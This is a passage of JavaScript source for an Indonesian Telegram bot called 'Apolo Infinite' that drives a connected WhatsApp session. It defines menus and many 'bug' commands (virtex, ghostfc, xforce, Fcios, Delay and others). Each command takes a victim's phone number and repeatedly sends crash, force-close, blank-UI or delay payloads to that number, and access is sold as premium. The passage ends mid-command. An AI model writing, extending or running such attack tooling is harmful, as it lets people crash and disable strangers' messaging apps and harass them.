    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug6Menu = `\`\`\`js
🌙 IOS BUG 🌙

⬡═―—⊱ IOS TYPE ⊰―—═⬡
  /iosinvis    - 628xx [ FORCLOSE IOS ]
  /iosdelay    - 628xx [ DELAY HARD IOS ]

🌙 IDUL FITRI KAREENN 🌙
\`\`\``;

    const keyboard = [
        [
            {
                text: "⬅️ Back",
                callback_data: "/bug", style : "success"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug6Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('bug7', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bug7Menu =`\`\`\`js  

🍁 VESIBLE BUG 🍁

⬡═―—⊱ VESIBlE TYPE ⊰―—═⬡
 /GhostBlank  - 628xx [ BLANK WA ]
 /GhostCrash  - 628xx [ CRASH HOME ]
 /DelayGay    - 628xx [ DELAY HARD 1000% ]
 /GhostFc     - 628xx [ FC INFINITE WA ]
 /Xblank      - 628xx [ BLANK/DELAY ]
 /Xblank-ui    - 628xx [ BLANK UI ]
 /Delay        - 628xx [ DELAY VISIBLE ]
 
 ━━━━━━━━━━━━━━━━━
 NOTE MENU YANG
 DIATAS TIDAK DISARAN
 KAN UNTUNG SENDER 
 NOKOS DAN CEPAT 
 MEMBUAT SENDER
 KENON TERIMAKASIH
 ━━━━━━━━━━━━━━━━━
 
🍁 Page 5/7 🍁
\`\`\``;

    const keyboard = [
        [
            { text: "◀️", callback_data: "/bug2", style : "danger" },
            { text: "HOME", callback_data: "menu_home", style : "success" },
            { text: "▶️", callback_data: "/tools", style : "danger" }
        ],
        [
            { text: "Owner", url: "https://t.me/Dikzztengg", style : "primary" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug7Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('tools', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const toolsMenu = `\`\`\`js   
⬡═―—⊱ OPTIONS & TOOLS ⊰―—═⬡
  /nfsw       - Anime Hentai
  /waifu      - Anime Waifu
  /anime      - Anime Girl


🍁 Page 6/7 ?🍁
\`\`\``;

    const keyboard = [
        [
            { text: "◀️", callback_data: "/bug2", style : "danger" },
            { text: "HOME", callback_data: "menu_home", style : "success" },
            { text: "▶️", callback_data: "/tools", style : "danger" }
        ],
        [
            { text: "Owner", url: "https://t.me/Dikzztengg", style : "primary" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug7Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('menu_tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const tqtoMenu = `\`\`\`js     
⬡═—⊱ THANKS TOO ⊰—═⬡ 
KING OWNER 
• DIKZ

KING SUPPORT
• Venn
• Xatanical
• Bawzhh
• Ryu
• Kinn
• All Users Script Apolo Infinite →
\`\`\``;


    const keyboard = [
        [
            {
                text: "(⎊) ☇ ʙᴀᴄᴋ",
                callback_data: "menu", style : "danger"
            }
        ]
    ];
    
    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

//case tools
bot.command("cekidgb", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekidgb https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

bot.command("nfsw", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.replyWithPhoto("https://files.catbox.moe/fw550e.jpg", "https://files.catbox.moe/20mu8c.jpg", "https://files.catbox.moe/vchvns.jpg", "https://files.catbox.moe/v9sc86.jpg");
});

bot.command("anime", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url); }
  catch { ctx.reply("❌ Gagal mengambil gambar anime"); }
});

bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});

//case bug
bot.command("..c", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Ghostdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await Delay(target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("..a", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Rxtracdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await DelayMakLoe(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible 
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("virtex", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /virtex 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await CrashUi(sock, target);
    await CrashUi(sock, target);
    await CrashUi(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ghostfc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ghostfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await maklufc(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xuiandro", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xuiandro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Home
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await blankButton(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Home
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xandro", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xandro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Home
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await CrashFrHome(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crash Home
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xperma", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xperma 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎊)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await StcDelay(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("xforce", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xforce 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forceclose Infinity
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await TeamXstromFc(target);
    await sleep(70000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forceclose Infinity
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xBall", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xBall 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: BlankXdelay
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await BlankXDelay(target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: BlankXdelay
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xblank-ui", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xblank-ui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Ui
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await Blankuiii(target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Ui
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗵𝗲𝗰𝗸 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Delay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Delay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 50; i++) {
    await StcDelay(target);
    await sleep(1500);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("Fcios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Fcios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await maklufc(target);
    await FcCallZero(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("buldozerdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /buldozerdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${target}
MODE      : Multi-Payload
STATUS    : Sedang Memasak
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await delayDozer(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
\`\`\`js
𝘈𝘗𝘖𝘓𝘖 𝘐𝘕𝘍𝘐𝘕𝘐𝘛𝘌 ATTACK
================================
TARGET    : ${q}
STATUS    : Completed
RESULT    : Successful
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

//menu bebas spam
bot.command("delaysw", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /delaysw 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>👻 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await DelayMakLoe(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("Xsilent", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Xsilent 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>☠️ MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎈)CHAT TARGET(⇋)", url: `https://wa.me/${q}`, style: "primary" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await DelayInvisV1(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});

bot.command("Xdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Xdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>🥶 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⇋)CHAT TARGET(⎊)", url: `https://wa.me/${q}`, style: "danger" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await StatusLove(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});


bot.command("clowdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /clowdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>Apolo Infinite
Bug terkirim: ${q}</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⎊)CHAT TARGET(⛥)", url: `https://wa.me/${q}`, style: "success" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await VampDelayAudio(target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});


bot.command("DelaySw", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /DelaySw 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>🎁 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "(⛥)CHAT TARGET(⇋)", url: `https://wa.me/${q}`, style: "primary" }],
        ],
      },
    }
  );

  for (let i = 0; i < 40; i++) {
    await teamXstrom(sock, target);
    await sleep(1000);
    console.log(`Succes Sending Bugs To : ${target}`);
  }
});


bot.command("Delayzupers", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Delayzupers 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote><pre>💤 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
